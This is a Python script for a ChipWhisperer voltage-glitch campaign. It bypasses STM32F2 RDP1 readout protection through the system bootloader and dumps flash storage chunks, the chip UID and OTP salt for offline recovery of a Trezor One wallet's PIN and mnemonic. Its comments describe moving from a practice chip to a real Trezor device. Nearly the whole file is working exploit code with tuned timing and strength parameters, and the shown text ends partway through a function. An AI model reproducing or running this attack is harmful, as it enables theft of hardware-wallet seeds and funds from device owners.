#!/usr/bin/env python
"""RDP1 glitch campaign -> full memory dump (was glitch2_campaign).

Stage-2 attack on the STM32F2 system bootloader: voltage-glitch the RDP1
readout refusal, and on the first ACK dump the whole storage sector for the
offline PIN brute-force chain (full_recover.py: storage 16KB @ 0x08008000
+ OTP3 + UID -> PIN -> mnemonic, self-checked against known-answer.json).

Target state (all proven on this rig): RDP1 chip, planted storage with known
PIN/seed at 0x08008000, bootloader syncs (0x7F->79), Read Memory NACKs (1F).

Attack: send the Read Memory command pair (0x11 0xEE) as one UART burst; TIO3
(tee'd on the FTDI TX line) gives an edge-locked trigger; the crowbar pulse
into VCAP (SMA on pads 31/47, short lead) fires ext_offset cycles later.
The RDP refusal happens after the 2-byte pair (~191 us burst; ~178 us past
the first rising edge) + processing - sweep just past that.

SUCCESS = ACK (0x79) instead of NACK -> immediately complete the Read Memory
exchange (addr 0x08008000, N=256) and verify the canary 4e524332 / 02 00 3C 00.

KEY PARAMETERS - SMA / crowbar mode (G_CROWBAR=1 default since 2026-10-27):
  G_CROWBAR=1            ARM the onboard MOSFET crowbar (glitch_hp=True +
                         vglitch_reset() errata release after every shot).
                         WITHOUT it the SMA carries only mV-scale gate
                         residue - ~6000 shots fired into disabled FETs
                         (FINDINGS 2026-10-27) were all no-ops.
  G_LP=1 (default on)   ALSO arm glitch_lp - hp+lp together = strongest
                         pull (newae forum 2668); part of the SWD-proven
                         strength set. If CLKGEN changes, rescale
                         EXT_MIN/MAX (ext units = clkgen cycles!).
  G_OUTPUT=enable_only   ONE continuous repeat-cycle crowbar pulse (width/
                         offset ignored, newae forum 2668). SWD-PROVEN mode:
                         the backup flash dumpers ran 100 MHz enable_only
                         hp+lp repeat 5/10. CAUTION: static-latched gates +
                         100 MHz killed a chip 2026-10-26 - keep repeat <=10.
  G_CLKGEN=119047619     119.05 MHz -> ext step ~8.4 ns; pulse = rep x that
  G_RND_REP=1 (default)  randomize strength EVERY shot: uniform pulse
  G_RND_LO=20 G_RND_HI=45  width in [LO,HI] nm (Kesenheimer-style 2D
                         search: ext grid x random strength). G_RND_REP=0
                         -> fixed G_REPEATS ladder instead.
  G_ADDR_RETRIES=5     on a command-ACK whose address phase is refused:
                          raw addr+count retries (NO glitch - just re-sends
                          the address bytes; state persists?). There is NO
                          second glitch: on RDP-1 a clean stage-1 glitch lets
                          the whole read proceed (jerinsunny single-pulse
                          capture), so ACK_NO_DATA is an imperfect stage-1,
                          fixed by stage-1 timing/strength - not a 2nd shot.
  G_REPEATS=5            strength knob (fixed mode): 5 cycles = 30.0 ns
                         Ladder (full-gap passes): 39nm = 1.7% dead,
                         flips ~1/14,000 (hammer39: 0/600 at hot points;
                         LA-verified no 79-after-burst - flips may be
                         reset-conditioned); 40nm = 3.4% dead, 0/13500;
                         41nm = ~5.7% dead; 42nm = 7.5% dead, ALL known
                         flips (8 real + zombie, ~1/1416); 45nm = 14.3%;
                         46nm+ = kill floor. 42nm = THE collection
                         strength (user decision 2026-10-28).
  G_US_MIN=179 G_US_MAX=183   window in US after the TIO3 edge = THE FLIP
                         BAND: all 5 ACK_NO_DATA flips ever recorded landed
                         at 179-182us (45nm x2, 42nm x3). Early window is
                         kill-only dead weight - do not sweep it. Cycles
                         derive from clkgen; G_EXT_* raw cycles override.
  G_WIDTH=5              (inert in enable_only; single value = one PR write)
  G_OFFSET=-45           (inert in enable_only; recipe value)
  G_SAMPLES=1 G_TAG=...
  launch: python rdp1_glitch_campaign_full_mem_dump.py        # all defaults
  override: G_EXT_MIN=.. G_EXT_MAX=.. G_WIDTH=.. G_REPEATS=.. G_TAG=.. \
            python rdp1_glitch_campaign_full_mem_dump.py

BOOTLOADER CONTROL - we own the boot pins through the CW:
  TIO1 = BOOT0 (True -> system bootloader; low/hi-Z with empty flash ->
        core executes garbage at 0xFFFFFFFE and locks up - NOT the bootloader)
  TIO4 = NRST (gpio_low ~20 ms pulse = reset)
  TIO2 = high_z, io.target_pwr = target supply MOSFET
  VERIFIED boot recipe: hold TIO1 True, io.target_pwr False 1.5 s -> True,
  wait ~3 s, then 0x7F on UART -> 0x79. NRST alone is NOT reliable out of
  lockup; always power-cycle with BOOT0 high. After a mid-session crash,
  resync only after that full reboot (0x7F mid-session is ignored).

Fast loop: after a plain NACK the bootloader session is alive - retry without
rebooting. After a crash (no response) - power-cycle and re-sync.

KNOWN-BASELINE GATE (2026-10-27): fired only when chip state is genuinely
UNKNOWN - after any dead/weird verdict, at campaign start, after a rig
drop. The gate: an UNGLITCHED 0x11 0xEE probe must NACK (0x1F) = bootloader
alive + RDP1 still armed + UART nominal. Recovery ladder: NRST resync
first, full power cycle (BOOT0 high) if the probe still fails. A plain
NACK needs no probe - the correct 0x1F answer IS the baseline proof, so
healthy streaks run at full speed. An UNGlitchED ACK means the bypass
persisted in-session - the read completes with no glitch.
"""
import atexit
import csv
import os
import random
import signal
import subprocess
import sys
import threading
import time
from datetime import datetime

import serial

import chipwhisperer as cw

from serialfind import find_ftdi

UART = find_ftdi()
# ---- FULL-DUMP COLLECTOR: every flip reads the NEXT MISSING chunk ----
# One flip = one transaction (the next 0x11 NACKs - verified 2026-10-28),
# so the full prize costs one flip per chunk. Priority: storage head (the
# old canary chunk - informational only, real chips have no canary), UID,
# OTP3, then the rest of the storage sector.
#
# *** CHIP-SPECIFIC TARGET LIST - DO NOT REUSE AS-IS ON THE TREZOR ***
# These 66 chunks are sized for the PRACTICE chip ONLY. It is a DIFFERENT,
# SMALLER-memory part than the Trezor One: this collection covers just its
# 16 KB planted storage region + uid + otp3. On the real Trezor One chip
# (larger flash) the dump must cover the FULL memory / full storage span:
# resize STORAGE_BASE + STORAGE_LEN to the Trezor's layout (uid/otp3
# addresses stay the same) and TARGETS regenerates. Cost scales linearly:
# every extra 256 B chunk costs ~1 more successful flip (~1/1400 shots
# each at 2026-10-28 rates) - budget the campaign accordingly.
# Trezor One storage = 2 NORCOW sectors (legacy/memory.h): sector 2 @ 0x08008000
# and sector 3 @ 0x0800C000, 16 KiB each, CONTIGUOUS -> 0x08008000-0x0800FFFF
# (32 KiB). The ACTIVE sector (holding the secrets) can be EITHER; the other is
# erased/backup. So DEFAULT covers BOTH sectors (real-device-ready) and, in
# targeted mode, we grab the HEAD of EACH sector. For a single-sector practice
# plant (e.g. chip-c) set G_STORAGE_LEN=0x4000. Same on 512KB/1MB parts
# (sectors 0-4 identical); total flash size never affects these addresses.
STORAGE_BASE = int(os.environ.get('G_STORAGE_BASE', '08008000'), 16)
STORAGE_LEN  = int(os.environ.get('G_STORAGE_LEN', '8000'), 16)   # 32KB=both sectors
SECTOR_LEN   = int(os.environ.get('G_SECTOR_LEN', '4000'), 16)    # 16KB NORCOW sector
# Global 256-B chunk index (decimal) across the region: storage_0000=0x08008000,
# storage_0064=0x0800C000 (sector-3 head). Names stay stable for G_RESUME.
_STORAGE = [(f'storage_{i:04d}', STORAGE_BASE + 256 * i, 256)
            for i in range(STORAGE_LEN // 256)]
# uid/otp3 are refused at the Read Memory address stage even with the gate
# glitched (15k shots/0, FINDINGS) AND the salt is recoverable from SRAM .bss
# with no glitch -> G_EXTRA=0 drops them so farming doesn't stall on uncrackable
# targets. Default 1 = keep (legacy behaviour).
_EXTRA = ([('uid', 0x1FFF7A10, 12), ('otp3', 0x1FFF7860, 32)]
          if os.environ.get('G_EXTRA', '1') == '1' else [])
TARGETS = _STORAGE + _EXTRA

# DEFAULT = TARGETED: grab only the pieces decryption needs. NORCOW (storage
# v2, fw 1.7+ incl 1.13.1) packs ALL secrets into the dict HEAD at 0x08008000,
# entries sequential: PIN_LOGS(0x0001), EDEK_PVC(0x0002, salt + encrypted
# DEK/SAK + poly1305 tag = complete offline-PIN-crack material), VERSION, then
# app entries incl the encrypted mnemonic (0x0102). Verified end-to-end
# 2026-10-30: PIN + full mnemonic recovered from just the first 3 chunks + uid.
# Chunks 3-63 are blank (FF) free space - no secret material, not worth glitching.
# 5 chunks = 1.25 KB covers the dict head with margin; the offline norcow parse
# flags any entry straddling the end -> bump G_TARGETED_N then. uid/otp3 are the
# PIN-KDF hardware salt (MKesenheimer's +0x190/+0x290 offsets are storage-v1,
# fw 1.6.x ONLY - do NOT use for v2).
if os.environ.get('G_FULL') == '1':
    pass                      # full 16 KB storage dump (mostly blank) + uid/otp3
else:
    _n = int(os.environ.get('G_TARGETED_N', 5))
    # grab the first _n chunks (the dict HEAD = secrets) of EVERY storage sector
    # in the region - the active sector's head decrypts; an inactive/blank sector
    # reads FF and is harmless. Covers whichever NORCOW sector is live on the
    # real device.
    _head = []
    for _soff in range(0, STORAGE_LEN, SECTOR_LEN):
        _c0 = _soff // 256
        _head += _STORAGE[_c0:_c0 + _n]
    TARGETS = _head + _EXTRA   # head chunks of each sector (+ uid/otp3)
CUR = [TARGETS[0]]          # [(name, addr, nbytes)] - what the NEXT flip reads
DONE = {}                   # name -> bytes collected this run (see G_RESUME)
DUMP_DIR = None             # dumps/run_YYYYmmdd_HHMMSS/, set in main()
ORACLE = None               # practice ground truth (storage.bin), if present


def validate_payload(data, nbytes):
    """Zombie check - deliberately ASYMMETRIC so it can never get stuck:
    - exact length required (short read = core died mid-transfer)
    - all-0x00 = ZOMBIE: dead TX line, or PCROP/SPRMOD latch corruption
      (jerinsunny.github.io/stm32_vglitch, STM32F4: glitch sets SPRMOD ->
      handshake ACKs but flash data reads return 0x00). Either way: retry.
    - all-0xFF = GENUINE: erased flash. 61/66 chunks legitimately read as
      FF x N (storage tail padding, possibly otp3) - rejecting them would
      deadlock the collector. NEVER reject 0xFF.
    """
    return (data is not None and len(data) == nbytes
            and data != b'\x00' * nbytes)

WIDTHS  = [int(x) for x in os.environ.get('G_WIDTH', '5').split(',')]
OFFSET  = int(os.environ.get('G_OFFSET', -45))
CLKGEN  = float(os.environ.get('G_CLKGEN', 166666667))  # 166.67MHz: rep5 = 30.0ns (user pick 2026-10-29); ext step ~6.0ns
OUTPUT  = os.environ.get('G_OUTPUT', 'enable_only')  # enable_only = ONE
         # continuous repeat-cycle crowbar pulse - the SWD-PROVEN mode
         # (backup dumpers: 100MHz enable_only hp+lp rep 5/10). glitch_only
         # = separate width/offset-shaped pulses (see newae forum 2668).
CROWBAR = os.environ.get('G_CROWBAR', '1') == '1'   # arm glitch_hp MOSFET -
         # without it the SMA never pulls the rail (FINDINGS 2026-10-27)
LP_ARM  = os.environ.get('G_LP', '1') == '1'        # ALSO arm glitch_lp:
         # hp+lp together = strongest crowbar pull (newae forum 2668);
         # part of the SWD-proven strength set - default ON
REPEATS = [int(x) for x in os.environ.get('G_REPEATS', '5').split(',')]
# RANDOMIZED STRENGTH (Kesenheimer-style 2D search): re-roll pulse width
# every shot, uniform in [G_RND_LO, G_RND_HI] ns. 0 disables (fixed ladder).
RND_REP = os.environ.get('G_RND_REP', '1') == '1'
RND_LO_NS = float(os.environ.get('G_RND_LO', 20))   # nm low end
RND_HI_NS = float(os.environ.get('G_RND_HI', 45))   # nm high end
# ACK-SPENDING (2026-10-29): a command-stage ACK is precious (~1/215
# shots in-cluster) - never waste it on one refused address phase.
ADDR_RETRIES = int(os.environ.get('G_ADDR_RETRIES', 5))  # raw addr retries
# (stage-2 glitch removed 2026-10-29: RDP-1 needs only a clean stage-1 - a
# single pulse clears RDP for the whole Read Memory. ACK_NO_DATA = dirty
# stage-1, fixed by stage-1 tuning, not a second glitch.)
# RDP decision window (user notes + LA 2026-10-27): sweet spot = the gap
# right AFTER the 0xEE stop bit ends (~+173us TIO3) and BEFORE the NACK
# starts (~+187us TIO3) -> default 173-187us = the full decision gap.
# Window is given in MICROSECONDS and converted to clkgen cycles here, so
# clkgen can be retuned for strength without hand-rescaling (old trap: cycle
# literals silently sliding the window ~18us on a clkgen change).
# G_EXT_MIN/G_EXT_MAX (raw cycles) override when explicitly set.
US_MIN = float(os.environ.get('G_US_MIN', 173))  # window start, us past TIO3 (hot zone head)
US_MAX = float(os.environ.get('G_US_MAX', 192))  # window end, us past TIO3 (NACK tail)
EXT_MIN = int(float(os.environ.get('G_EXT_MIN', US_MIN * CLKGEN / 1e6)))
EXT_MAX = int(float(os.environ.get('G_EXT_MAX', US_MAX * CLKGEN / 1e6)))
if os.environ.get('G_US_STEP'):
    # coarse scouts specced in us (e.g. 0.1), converted to nearest whole
    # clkgen cycle - at 128.21MHz, 0.1us -> 13 cycles = 101ns
    STEP = max(1, round(float(os.environ.get('G_US_STEP')) * CLKGEN / 1e6))
else:
    STEP = int(os.environ.get('G_STEP', 1))
# Hammer exact ext offsets (comma list, e.g. G_EXTS=21398,21686): overrides
# the range sweep - used to re-strike known-winning offsets.
EXTS = [int(x) for x in os.environ.get('G_EXTS', '').split(',') if x.strip()]
SAMPLES = int(os.environ.get('G_SAMPLES', 3))  # shots per grid point
# CONFIRMATION LAYER (2026-10-29): cross-read is the oracle-free judge that
# goes to the real device - read the same chunk N times from the latched
# session, trust only bytes that reproduce across >= MIN of them.
CROSSREAD_N = int(os.environ.get('G_CROSSREAD_N', 3))     # reads per chunk
CROSSREAD_MIN = int(os.environ.get('G_CROSSREAD_MIN', 2))  # agreeing to CONFIRM
ALERT = os.environ.get('G_ALERT', '1') == '1'  # audible + spoken SUCCESS alert
SHOTS_MAX = int(os.environ.get('G_SHOTS', 15000))  # fits band farm 479pts x 30 (14370)
COOLDOWN = float(os.environ.get('G_COOLDOWN', 0.15))
RESET_EVERY = int(os.environ.get('G_RESET_EVERY', 1))  # 1 = reset+resync
#   EVERY shot (Kesenheimer one-shot-per-boot, default 2026-10-29); 0 = off
REST_EVERY = int(os.environ.get('G_REST_EVERY', 300))
REST_S  = float(os.environ.get('G_REST_S', 10))

CANARY_MAGIC = bytes.fromhex('4e524332')      # 'NRC2' LE at 0x08008000

scope = None
ser = None
_torn = False


def teardown(*_):
    global _torn
    if _torn:
        return
    _torn = True
    for attr, val in (('glitch_hp', False), ('glitch_lp', False),
                      ('target_pwr', False), ('nrst', 'high_z')):
        try:
            setattr(scope.io, attr, val)
        except Exception:
            pass
    try:
        scope.dis()
    except Exception:
        pass


atexit.register(teardown)
signal.signal(signal.SIGINT, teardown)
signal.signal(signal.SIGTERM, teardown)


def boot_and_sync(fast=True):
    """Recover the bootloader session. NRST pulse = ~350ms; power cycle =
    ~4.5s fallback (also used for the initial boot)."""
    if fast:
        scope.io.tio4 = 'gpio_low'
        time.sleep(0.02)
        scope.io.tio4 = 'high_z'
    else:
        scope.io.tio1 = True
        scope.io.tio2 = 'high_z'
        scope.io.target_pwr = False
        time.sleep(1.5)
        scope.io.target_pwr = True
        time.sleep(3)
        # re-latch crowbar drivers after power events: the glitch_hp gate
        # drive must be re-armed (FINDINGS 2026-10-26/27). CROWBAR mode arms
        # hp for glitch_only; G_LATCH keeps the legacy enable_only+lp variant.
        if CROWBAR:
            scope.io.glitch_hp = False; scope.io.glitch_hp = True
            if LP_ARM:
                scope.io.glitch_lp = False; scope.io.glitch_lp = True
        if OUTPUT == 'enable_only' and os.environ.get('G_LATCH') == '1':
            scope.io.glitch_hp = False; scope.io.glitch_hp = True
            scope.io.glitch_lp = False; scope.io.glitch_lp = True
    for _ in range(8):
        _kick()
        ser.reset_input_buffer()
        ser.write(b'\x7f')
        if b'\x79' in ser.read(8):
            return True
        time.sleep(0.05)
    return False


def complete_read():
    """Command got ACKed - finish the Read Memory exchange for the CURRENT
    collector target (CUR). Returns (bytes, None) or (None, note)."""
    _name, addr, nbytes = CUR[0]
    ab = addr.to_bytes(4, 'big')
    ser.write(ab + bytes([ab[0] ^ ab[1] ^ ab[2] ^ ab[3]]))
    r = ser.read(8)
    if not r or r[0] != 0x79:
        return None, f'addr stage refused: {r.hex() if r else "(nothing)"}'
    n1 = nbytes - 1
    ser.write(bytes([n1, n1 ^ 0xFF]))
    r = ser.read(nbytes + 16)
    if not r or r[0] != 0x79:
        return None, f'len stage refused: {r.hex()[:16] if r else "(nothing)"}'
    return r[1:1 + nbytes], None


def save_chunk(name, data, meta):
    ensure_dump_dir()
    open(os.path.join(DUMP_DIR, name + '.bin'), 'wb').write(data)
    with open(os.path.join(DUMP_DIR, 'manifest.txt'), 'a') as mf:
        mf.write(meta + '\n')


def next_target():
    for t in TARGETS:
        if t[0] not in DONE:
            return t
    return None


# uid/otp3 live outside flash: a dirty single flip gets a command-ACK but the
# address stage refuses them (verified 2026-10-30). They are LATCH-ONLY targets
# - only a genuine session latch (bypass holding across unglitched reads) can
# read them, if they are readable via Read Memory at all. So we never FARM them
# with single glitches (that was the 15k-shot drought); we farm flash and grab
# uid/otp3 the instant any latch fires.
EXTRA_NAMES = tuple(t[0] for t in _EXTRA)


def next_storage_target():
    """Next undone NON-extra (flash) range - what the single-shot loop farms."""
    for t in TARGETS:
        if t[0] not in EXTRA_NAMES and t[0] not in DONE:
            return t
    return None


def next_farm_target():
    """What CUR should point at for glitch farming. Prefer an undone flash
    range; once all flash is banked but uid/otp3 still need a latch, fish on ANY
    flash range (re-read the first one - harmless re-confirm) purely to keep
    provoking flips/latches until one latches and delivers uid/otp3."""
    t = next_storage_target()
    if t is not None:
        return t
    return next((x for x in TARGETS if x[0] not in EXTRA_NAMES), TARGETS[0])


# ---------------------------------------------------------------------------
# CONFIRMATION LAYER - two independent judges for a recovered chunk, so a
# glitch SUCCESS can be trusted without peeking at the answer:
#   A = oracle    byte-compare vs storage.bin. Ground truth, PRACTICE ONLY
#                 (ORACLE is None on the real device). Gates banking here.
#   B = cross-read  read the SAME chunk several times from the latched
#                 session; trust only bytes that reproduce. No external truth,
#                 so this is the judge that goes to the real device.
# On practice both run: the oracle gates, cross-read is scored against it
# (A/B confusion matrix -> ab_matrix.txt). On the real device ORACLE is None
# and cross-read becomes the gate. all-FF is NOT special here - a legitimately
# erased chunk reproduces all-FF and is CONFIRMED correctly (2026-10-29).
# ---------------------------------------------------------------------------
AB = {}                 # (oracle_verdict, crossread_verdict) -> count
_ab_writer = [None]     # csv.writer for per-event ab_log.csv
_ab_file = [None]
_dump_made = [False]    # dumps/run_.../ is created lazily on the first find


def ensure_dump_dir():
    """Create dumps/run_.../ and open ab_log.csv - but only on the first
    thing worth saving (a flip candidate). An empty run leaves no folder
    behind (2026-10-29 user request)."""
    if _dump_made[0]:
        return
    os.makedirs(DUMP_DIR, exist_ok=True)
    f = open(os.path.join(DUMP_DIR, 'ab_log.csv'), 'w', newline='')
    w = csv.writer(f)
    w.writerow(['time', 'chunk', 'addr', 'nbytes', 'oracle', 'crossread',
                'n_reads', 'first16'])
    _ab_file[0], _ab_writer[0] = f, w
    _dump_made[0] = True
    print(f'[+] first find - created dump dir {DUMP_DIR}', flush=True)


def alert_success(text):
    """Fire-and-forget desktop alert on a flip: terminal bell + chime +
    spoken line. Never blocks the campaign and never raises."""
    if not ALERT:
        return
    try:
        sys.stdout.write('\a')
        sys.stdout.flush()
    except Exception:
        pass
    env = dict(os.environ)
    env.setdefault('DISPLAY', ':1')
    for cmd in (['canberra-gtk-play', '-i', 'complete'],
                ['spd-say', '-r', '-10', text]):
        try:
            subprocess.Popen(cmd, env=env, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
        except Exception:
            pass


def oracle_check(target, data):
    """A-judge: MATCH / MISMATCH vs storage.bin, or NA (no oracle / out of
    range / wrong length)."""
    _name, addr, nbytes = target
    if ORACLE is None or data is None or len(data) != nbytes:
        return 'NA'
    lo = addr - STORAGE_BASE
    if lo < 0 or lo + nbytes > len(ORACLE):
        return 'NA'
    return 'MATCH' if ORACLE[lo:lo + nbytes] == data else 'MISMATCH'


def read_target_n(target, n):
    """Latched unglitched reads of `target`, up to n. Each needs a fresh
    0x11 0xEE ACK (proof the bypass still holds) + a full-length payload;
    stops the instant the latch drops. Returns the list of payloads read."""
    reads = []
    save = CUR[0]
    CUR[0] = target
    try:
        for _ in range(n):
            ser.reset_input_buffer()
            ser.write(b'\x11\xee')
            r = ser.read(8)
            if not r or 0x79 not in r:
                break
            data, _note = complete_read()
            if data is None or len(data) != target[2]:
                break
            reads.append(data)
    finally:
        CUR[0] = save
    return reads


def crossread_verdict(reads, nbytes):
    """B-judge over a list of reads (glitch candidate first, if any):
      CONFIRMED  >= CROSSREAD_MIN reads, all identical & right length
      GHOST      enough reads but they disagree (transient corruption)
      UNCONFIRMED  too few reads (latch dropped before we could verify)
    Returns (verdict, confirmed_bytes_or_None, n_good)."""
    good = [r for r in reads if r is not None and len(r) == nbytes]
    if len(good) < CROSSREAD_MIN:
        return 'UNCONFIRMED', None, len(good)
    if all(r == good[0] for r in good):
        return 'CONFIRMED', good[0], len(good)
    return 'GHOST', None, len(good)


def confirm_chunk(target, candidate):
    """Run both judges on a recovered chunk. `candidate` = the glitched read
    (counts as cross-read #1); None when draining an already-latched session.
    Logs one A/B row. Returns (banked_bytes_or_None, oracle_verdict,
    crossread_verdict, n_good). Gate: oracle in practice, cross-read on the
    real device."""
    ensure_dump_dir()
    name, addr, nbytes = target
    want = CROSSREAD_N - (1 if candidate is not None else 0)
    extra = read_target_n(target, max(0, want))
    reads = ([candidate] if candidate is not None else []) + extra
    crv, cr_bytes, n_good = crossread_verdict(reads, nbytes)
    rep = candidate if candidate is not None else (reads[0] if reads else None)
    orv = oracle_check(target, rep)
    AB[(orv, crv)] = AB.get((orv, crv), 0) + 1
    if _ab_writer[0]:
        _ab_writer[0].writerow(
            [f'{datetime.now():%H:%M:%S}', name, f'0x{addr:08X}', nbytes,
             orv, crv, n_good, (rep[:16].hex() if rep else '')])
        _ab_file[0].flush()
    if ORACLE is not None and orv in ('MATCH', 'MISMATCH'):
        # oracle can judge this chunk (in storage.bin range) -> it gates
        banked = rep if orv == 'MATCH' else None
    else:
        # oracle can't judge (uid/otp3 are outside storage.bin -> orv='NA'),
        # or no oracle at all (real device) -> cross-read is the gate
        banked = cr_bytes if crv == 'CONFIRMED' else None
    return banked, orv, crv, n_good


def write_ab_matrix():
    """Confusion matrix: cross-read (B) scored against the oracle (A). The
    number that gates real-device trust is FALSE ACCEPTS = 0."""
    rows = ['MATCH', 'MISMATCH', 'NA']
    cols = ['CONFIRMED', 'UNCONFIRMED', 'GHOST']
    L = ['A/B confusion matrix  (A=oracle truth  x  B=cross-read judge)',
         'rows = oracle verdict, cols = cross-read verdict', '',
         f'{"":>9}' + ''.join(f'{c:>13}' for c in cols)]
    for r in rows:
        L.append(f'{r:>9}' + ''.join(f'{AB.get((r, c), 0):>13}' for c in cols))
    fa = AB.get(('MISMATCH', 'CONFIRMED'), 0)
    fr = AB.get(('MATCH', 'GHOST'), 0)
    und = AB.get(('MATCH', 'UNCONFIRMED'), 0)
    tp = AB.get(('MATCH', 'CONFIRMED'), 0)
    tn = AB.get(('MISMATCH', 'GHOST'), 0)
    L += ['',
          f'FALSE ACCEPTS (oracle MISMATCH, cross-read CONFIRMED): {fa}'
          + ('   <-- MUST be 0 before trusting cross-read on the real device'
             if fa else '   (0 - good)'),
          f'false rejects (oracle MATCH, cross-read GHOST):        {fr}',
          f'unconfirmed   (oracle MATCH, too few latched reads):   {und}',
          f'true accepts {tp}   true rejects {tn}']
    denom = tp + fr + und
    if denom:
        L.append(f'cross-read on real data: {100 * tp / denom:.1f}% confirmed, '
                 f'{100 * fr / denom:.1f}% false-rejected, '
                 f'{100 * und / denom:.1f}% unconfirmed (n={denom})')
    txt = '\n'.join(L)
    if DUMP_DIR:
        try:
            open(os.path.join(DUMP_DIR, 'ab_matrix.txt'), 'w').write(txt + '\n')
        except Exception:
            pass
    print('\n' + txt, flush=True)


def latch_probe(target):
    """One UNGLITCHED Read Memory of `target` while (maybe) latched. Returns
    (data_or_None, cmd_acked). cmd_acked=True means the 0x11 0xEE command still
    ACKs (0x79) - the session latch is ALIVE - regardless of whether the address
    stage served data. This separates 'latch alive but this address refused'
    (the decisive OTP negative) from 'latch truly dropped' (command NACK)."""
    ser.reset_input_buffer()
    ser.write(b'\x11\xee')
    r = ser.read(8)
    if not r or 0x79 not in r:
        return None, False                   # command NACK / silence -> gone
    save = CUR[0]
    CUR[0] = target
    try:
        data, _note = complete_read()
    finally:
        CUR[0] = save
    if data is not None and len(data) == target[2]:
        return data, True
    return None, True                        # latch alive, address refused


def grab_extras_latched():
    """FIRST thing on any live latch: go for the latch-only targets (uid, otp3)
    before draining anything else - the latch is the only context they can be
    read, and it may be short-lived. Each is probed up to CROSSREAD_N times with
    latch-liveness so an address-refusal is logged as the decisive negative, not
    mistaken for a dropped latch. Returns True if the latch is still alive."""
    alive = True
    for name, addr, nbytes in _EXTRA:
        if name in DONE:
            continue
        t = (name, addr, nbytes)
        reads = []
        acked_any = False
        for _ in range(CROSSREAD_N):
            data, acked = latch_probe(t)
            if not acked:
                alive = False
                break
            acked_any = True
            if data is not None:
                reads.append(data)
        crv, cr_bytes, n_good = crossread_verdict(reads, nbytes)
        orv = oracle_check(t, reads[0] if reads else None)
        AB[(orv, crv)] = AB.get((orv, crv), 0) + 1
        if crv == 'CONFIRMED':
            DONE[name] = cr_bytes
            save_chunk(name, cr_bytes, f'{datetime.now():%H:%M:%S} LATCHED '
                       f'{name} (grabbed first under latch) [{orv}/{crv}]')
            print(f'  [LATCHED+] *** {name} secured under latch '
                  f'({len(DONE)}/{len(TARGETS)}) [{orv}/{crv}] ***', flush=True)
            alert_success(f'{name} secured under latch')
        elif n_good > 0:
            print(f'  [extra] {name}: latched reads disagreed ({crv}) - '
                  f'not banked', flush=True)
        elif acked_any:
            # latch provably ALIVE (0x11 kept ACKing) yet the address stage
            # refused every read: the decisive negative - this region is not
            # served by Read Memory even under a genuine bypass.
            print(f'  [extra] {name}: command LATCHED but address 0x{addr:08X} '
                  f'REFUSED all reads - region not served by Read Memory under '
                  f'bypass', flush=True)
        if not alive:
            break
    return alive


def chain_unglitched():
    """Right after a flipped read the bypass often latches (unglitched 0x11 0xEE
    keeps ACKing). Policy: on ANY latch, grab the latch-only targets (uid/otp3)
    FIRST, then drain remaining flash while the latch holds. Returns True ONLY
    when the FULL target set (incl uid/otp3) is collected - so the campaign is
    not 'done' until a latch has delivered uid/otp3."""
    # 1) FIRST: spend the fresh latch on uid/otp3.
    alive = grab_extras_latched()
    if not alive:
        return next_target() is None         # latch gone; done only if all in
    # 2) THEN: drain remaining flash ranges while the latch still holds.
    while True:
        t = next_storage_target()
        if t is None:
            break                            # all flash drained
        banked, orv, crv, n_good = confirm_chunk(t, None)
        if banked is not None:
            DONE[t[0]] = banked
            save_chunk(t[0], banked, f'{datetime.now():%H:%M:%S} LATCHED '
                       f'{t[0]} [{orv}/{crv}]')
            print(f'  [LATCHED+] {t[0]} drained '
                  f'({len(DONE)}/{len(TARGETS)} chunks) [{orv}/{crv}]',
                  flush=True)
            continue
        if n_good == 0:
            print(f'  [latch] dropped at {t[0]} - back to glitching',
                  flush=True)
        else:
            open(os.path.join(DUMP_DIR, t[0] + '.bad.bin'), 'wb').write(
                b'')  # marker; reads disagreed / oracle mismatch
            print(f'  [latch] {t[0]} rejected ({orv}/{crv}) - not banked',
                  flush=True)
        break
    return next_target() is None             # fully done only if uid/otp3 too


def assemble_and_report():
    """Write assembled outputs + coverage report into DUMP_DIR."""
    if not _dump_made[0]:
        # nothing was ever found - no folder, nothing to assemble
        print(f'[=] collected 0/{len(TARGETS)} chunks - no dump dir '
              '(nothing found)', flush=True)
        return
    if next_target() is None:
        _nc = STORAGE_LEN // 256
        if all(f'storage_{i:04d}' in DONE for i in range(_nc)):
            storage = b''.join(DONE[f'storage_{i:04d}'] for i in range(_nc))
            open(os.path.join(DUMP_DIR, 'storage_dump.bin'), 'wb').write(storage)
        else:
            # targeted/partial run: write the contiguous storage HEAD we have
            # (don't fabricate a full 16 KB from chunks we never dumped)
            _h = []
            _i = 0
            while f'storage_{_i:04d}' in DONE:
                _h.append(DONE[f'storage_{_i:04d}'])
                _i += 1
            open(os.path.join(DUMP_DIR, 'storage_head.bin'), 'wb').write(
                b''.join(_h))
            print(f'[=] targeted collection: storage_head.bin = {_i} chunks '
                  '(+ uid/otp3)', flush=True)
        if 'uid' in DONE:
            open(os.path.join(DUMP_DIR, 'uid.hex'), 'w').write(
                DONE['uid'].hex() + '\n')
        if 'otp3' in DONE:
            open(os.path.join(DUMP_DIR, 'otp3.hex'), 'w').write(
                DONE['otp3'].hex() + '\n')
        print('[***] COLLECTION COMPLETE - storage image + uid.hex/otp3.hex '
              f'written ({len(DONE)}/{len(TARGETS)} targets)', flush=True)
        alert_success('collection complete')
    write_ab_matrix()
    print(f'[=] collected {len(DONE)}/{len(TARGETS)} chunks -> {DUMP_DIR}',
          flush=True)


LAST_W = LAST_O = None


# ---- watchdog: USB-serial disconnects can wedge pyserial's poll forever;
# if no progress for 60 s, hard-exit so the hammer loop relaunches cleanly.
_progress = [time.time()]
_flat = [0]         # consecutive clean nacks (flatline detector)


def _watchdog():
    while True:
        time.sleep(10)
        if time.time() - _progress[0] > 60:
            print('  [watchdog] no progress for 60s - hard exit for relaunch',
                  flush=True)
            os._exit(3)


def _kick():
    _progress[0] = time.time()


def baseline_probe():
    """KNOWN-BASELINE gate probe: an UNGLITCHED 0x11 0xEE pair must NACK
    (0x1F). Proves bootloader alive + RDP1 still armed + UART nominal -
    i.e. the exact pre-shot state every glitch is fired from. 'unlocked'
    = it ACKed with NO glitch (bypass persisted in-session - jackpot)."""
    ser.reset_input_buffer()
    ser.write(b'\x11\xee')
    r = ser.read(8)
    if r and 0x79 in r:
        return 'unlocked'
    if r and 0x1F in r:
        return 'ok'
    return 'bad'


def baseline_then_shot(ext_offset, width, repeat):
    """Baseline gate + one glitched shot - used ONLY when the chip state is
    genuinely unknown: after any dead/weird verdict, at campaign start, and
    after a rig drop. A plain NACK needs no probe - the correct 0x1F answer
    IS the baseline proof (alive + RDP1 armed + UART nominal)."""
